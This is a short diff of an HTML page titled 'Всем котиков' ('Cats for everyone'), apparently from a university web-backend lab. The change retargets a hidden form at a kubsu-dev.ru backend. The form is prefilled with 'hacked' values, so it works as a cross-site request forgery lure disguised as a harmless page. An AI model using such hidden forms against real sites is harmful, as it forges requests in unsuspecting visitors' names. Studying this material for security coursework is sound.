@@ -7,7 +7,7 @@
         <title>Всем котиков</title>
     </head>
     <body>
-        <form method="post" action="http://u1057.kubsu-dev.ru/backend7/index.php">
+        <form method="post" action="http://u41057.kubsu-dev.ru/backend7/index.php">
             <div class="form-group" style="display:none;">
                     <input type="text" name="name" value="взломан">
                     <input type="text" name="email" value="hacked@mail.ru">
